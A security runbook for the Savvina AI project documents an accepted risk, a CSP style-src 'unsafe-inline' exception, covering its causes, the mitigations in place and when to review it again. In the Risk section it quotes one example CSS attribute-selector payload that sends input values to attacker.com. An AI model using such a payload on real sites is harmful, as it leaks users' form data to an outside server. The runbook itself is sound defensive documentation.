# Security Runbook — Savvina AI

> **Audience:** Savvina AI maintainers and security reviewers.  
> **Purpose:** Document known security exceptions, accepted risks, and standing mitigations.
> Entries are reviewed on each major dependency upgrade or architectural change.

---

## Accepted Risk Register

| Title | Severity | Status | Last Reviewed |
|-------|----------|--------|---------------|
| CSP `style-src 'unsafe-inline'` | Low | Accepted — documented | 2026-05-27 |

---

## CSP `style-src 'unsafe-inline'`

### Affected files

| File | Line |
|------|------|
| `frontend/nginx.conf` | 19 |
| `backend/app/main.py` | 170 |

### Description

Both the nginx `Content-Security-Policy` header and FastAPI's `SecurityHeadersMiddleware`
allow `'unsafe-inline'` for `style-src`:

```nginx
# frontend/nginx.conf:19
add_header Content-Security-Policy "... style-src 'self' 'unsafe-inline'; ..." always;
```

```python
# backend/app/main.py:170
"style-src 'self' 'unsafe-inline'; "
```

### Risk

`'unsafe-inline'` in `style-src` means a successful XSS attack could inject arbitrary CSS.
Potential consequences:

- **UI redressing / visual clickjacking** via CSS overlays (e.g. a transparent div positioned
  over a sensitive button)
- **Limited data exfiltration** via CSS attribute selectors (`input[value^="a"] { background:
  url(https://attacker.com/?c=a) }`) — only works when an attacker can load external
  resources, which is blocked here by the restrictive `default-src 'self'`

`'unsafe-inline'` in `style-src` **does not** enable JavaScript execution. The full XSS
attack chain requires `'unsafe-inline'` in `script-src`, which is **not** present.

**Severity: Low** — mitigating controls reduce the practical impact significantly (see below).

### Root cause — why `'unsafe-inline'` cannot be removed without major refactoring

Three compounding constraints prevent removing `'unsafe-inline'`:

**1. Pure static SPA architecture**  
`frontend/index.html` is a pre-built static file served directly by nginx. There is no
server-side rendering, no template engine, and no per-request HTML generation. A nonce-based
CSP requires generating a fresh random nonce server-side on every request and injecting it
into `<head>` — that is architecturally impossible without adding SSR.

**2. Radix UI nonce support is partial**  
As of the versions in use (audited 2026-05-27):

| Package | Version | `nonce` prop? |
|---------|---------|----------------|
| `@radix-ui/react-select` | 2.2.6 | ✅ on `SelectViewport` |
| `@radix-ui/react-scroll-area` | 1.2.10 | ✅ on `ScrollAreaViewport` |
| `@radix-ui/react-dialog` | 1.1.15 | ❌ |
| `@radix-ui/react-dropdown-menu` | 2.1.16 | ❌ |
| `@radix-ui/react-tooltip` | 1.2.8 | ❌ |
| `@radix-ui/react-popover` | 1.1.15 | ❌ |
| `@radix-ui/react-tabs` | 1.1.13 | ❌ |
| `@radix-ui/react-label` | 2.1.6 | ❌ |
| `@radix-ui/react-separator` | 1.1.8 | ❌ |
| `@radix-ui/react-slot` | 1.2.4 | ❌ |

**3. CSP nonces do not apply to `style=` attributes**  
Radix UI portal-based overlays (Tooltip, Dropdown, Dialog, Popover) compute their position at
runtime and inject it as an inline `style=` attribute on the DOM element
(e.g. `style="top: 42px; left: 120px; transform: ..."`). The CSP specification allows nonces
on `<style>` and `<link rel="stylesheet">` elements only — **not** on `style=` attributes.
Dynamic positioning values therefore require `'unsafe-inline'` regardless of any nonce
implementation.

### Mitigating controls already in place

| Control | Effect |
|---------|--------|
| `script-src 'self'` (no `'unsafe-inline'`) | Blocks inline and eval JavaScript — the primary XSS vector that could inject malicious CSS |
| `X-Frame-Options: DENY` | Blocks clickjacking via `<iframe>` embedding independently of CSS |
| `default-src 'self'` | Blocks external resource loads, preventing CSS-based data exfiltration to attacker-controlled servers |
| API routes: `default-src 'none'` | REST API responses receive the most restrictive possible policy |
| Input validation + parameterised queries | Reduces the XSS attack surface that would be needed to reach this vector |

### Future mitigation path

Remove `'unsafe-inline'` only when **all three** conditions are met:

1. **SSR is added** — FastAPI (or a proxy) renders `index.html` per-request via a template
   engine and injects a cryptographically random nonce into `<head>` and the CSP header
2. **Radix UI upgrades** — All Radix packages expose a `nonce` prop (check release notes on
   each major version bump)
3. **Positioning strategy change** — Portal-based overlays use CSS variables or class-based
   transforms instead of runtime `style=` attributes, eliminating the inline-style attribute
   requirement

### Review triggers

Re-evaluate this entry when any of the following occur:

- Radix UI major version upgrade (check for new `nonce` prop support)
- Addition of SSR or a server-side rendering proxy
- Replacement of Radix UI primitives with an alternative library
- Addition of a Content Security Policy reporting endpoint (`report-uri` or `report-to`)
